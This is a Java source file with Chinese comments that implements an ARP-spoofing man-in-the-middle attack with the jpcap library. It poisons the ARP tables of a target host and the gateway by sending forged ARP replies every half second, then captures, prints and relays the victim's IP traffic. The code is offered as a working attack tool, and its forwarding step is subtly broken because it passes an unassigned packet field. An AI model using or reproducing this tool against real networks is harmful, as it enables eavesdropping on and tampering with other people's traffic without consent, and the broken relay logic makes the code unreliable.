package lan_monitor;

import java.io.IOException;
import java.net.InetAddress;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;

public class changeARP {
    private NetworkInterface[] devices; // 设备列表

    private NetworkInterface device; // 要使用的设备

    private JpcapCaptor jpcap; // 与设备的连接

    private JpcapSender sender; // 用于发送的实例

    private final byte[] targetMAC, gateMAC; // B的MAC地址，网关的MAC地址

    private final String targetIp, gateIp; // B的IP地址，网关的IP地址

    private final Thread thread;
    private final ARPPacket arpTarget;
    private final ARPPacket arpGate;
    private Packet packet;

    private NetworkInterface getDevice() throws IOException {
        devices = JpcapCaptor.getDeviceList(); // 获得设备列表
        device = devices[0];// 只有一个设备
        jpcap = JpcapCaptor.openDevice(device, 2000, false, 10000); // 打开与设备的连接
        jpcap.setFilter("ip", true); // 只监听B的IP数据包
        sender = jpcap.getJpcapSenderInstance();
        return device;
    }

    public changeARP(byte[] targetMAC, String targetIp, byte[] gateMAC, String gateIp) throws InterruptedException,
            IOException {
        this.targetMAC = targetMAC;
        this.targetIp = targetIp;
        this.gateMAC = gateMAC;
        this.gateIp = gateIp;
        getDevice();
        arpTarget = new ARPPacket(); // 修改B的ARP表的ARP包
        arpTarget.hardtype = ARPPacket.HARDTYPE_ETHER; // 选择以太网类型(Ethernet)
        arpTarget.prototype = ARPPacket.PROTOTYPE_IP; // 选择IP网络协议类型
        arpTarget.operation = ARPPacket.ARP_REPLY; // 选择REPLY类型
        arpTarget.hlen = 6; // MAC地址长度固定6个字节
        arpTarget.plen = 4; // IP地址长度固定4个字节
        arpTarget.sender_hardaddr = device.mac_address; // A的MAC地址
        arpTarget.sender_protoaddr = InetAddress.getByName(gateIp).getAddress(); // 网关IP
        arpTarget.target_hardaddr = targetMAC; // B的MAC地址
        arpTarget.target_protoaddr = InetAddress.getByName(targetIp).getAddress(); // B的IP

        EthernetPacket ethToTarget = new EthernetPacket(); // 创建一个以太网头

        ethToTarget.frametype = EthernetPacket.ETHERTYPE_ARP;// 选择以太包类型

        ethToTarget.src_mac = device.mac_address; // A的MAC地址

        ethToTarget.dst_mac = targetMAC; // B的MAC地址

        arpTarget.datalink = ethToTarget; // 将以太头添加到ARP包前

        arpGate = new ARPPacket(); // 修改网关ARP表的包

        arpGate.hardtype = ARPPacket.HARDTYPE_ETHER; // 跟以上相似，不再重复注析

        arpGate.prototype = ARPPacket.PROTOTYPE_IP;

        arpGate.operation = ARPPacket.ARP_REPLY;

        arpGate.hlen = 6;

        arpGate.plen = 4;

        arpGate.sender_hardaddr = device.mac_address;

        arpGate.sender_protoaddr = InetAddress.getByName(targetIp).getAddress();

        arpGate.target_hardaddr = gateMAC;

        arpGate.target_protoaddr = InetAddress.getByName(gateIp).getAddress();

        EthernetPacket ethToGate = new EthernetPacket();

        ethToGate.frametype = EthernetPacket.ETHERTYPE_ARP;

        ethToGate.src_mac = device.mac_address;

        ethToGate.dst_mac = gateMAC;

        arpGate.datalink = ethToGate;

        thread = new Thread(new Runnable() { // 创建一个进程控制发包速度
                    @Override
                    public void run() {
                        while (true) {
                            sender.sendPacket(arpTarget);
                            sender.sendPacket(arpGate);
                            try {
                                Thread.sleep(500);
                            }
                            catch (InterruptedException e) {
                                // TODO Auto-generated catch block
                                e.printStackTrace();
                            }
                        }
                    }
                });
        thread.start();
        recP(); // 接收数据包并转发
    }

    /**
     * 修改包的以太头，转发数据包 参数 packet 收到的数据包 参数 changeMAC 要转发出去的目标 　　
     */
    private void send(Packet packet, byte[] changeMAC) {
        EthernetPacket eth;
        if (packet.datalink instanceof EthernetPacket) {
            eth = (EthernetPacket) packet.datalink;
            for (int i = 0; i < 6; i++) {
                eth.dst_mac[i] = changeMAC[i]; // 修改包以太头，改变包的目标
                eth.src_mac[i] = device.mac_address[i]; // 源发送者为A
            }
            sender.sendPacket(packet);
        }
    }

    /**
     * 打印接受到的数据包并转发
     */
    public void recP() {
        IPPacket ipPacket = null;
        while (true) {
            ipPacket = (IPPacket) jpcap.getPacket();
            System.out.println(ipPacket);
            if (ipPacket.src_ip.getHostAddress().equals(targetIp)) {
                send(packet, gateMAC);
            }
            else {
                send(packet, targetMAC);
            }
        }
    }
}
